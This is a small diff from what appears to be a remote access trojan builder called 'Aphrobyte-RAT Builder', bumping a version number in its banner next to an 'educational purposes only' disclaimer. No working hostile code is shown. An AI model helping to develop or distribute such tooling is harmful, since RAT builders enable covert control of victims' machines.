@@ -61,7 +61,7 @@ ascii_art = """
 ╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
 
 This tool has been made for educational purposes only. I am not responsible for any misuse of this tool.
-Made by RIOT Administration | v1.9.1
+Made by RIOT Administration | v1.9.2
 """ 
 clear()
 os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
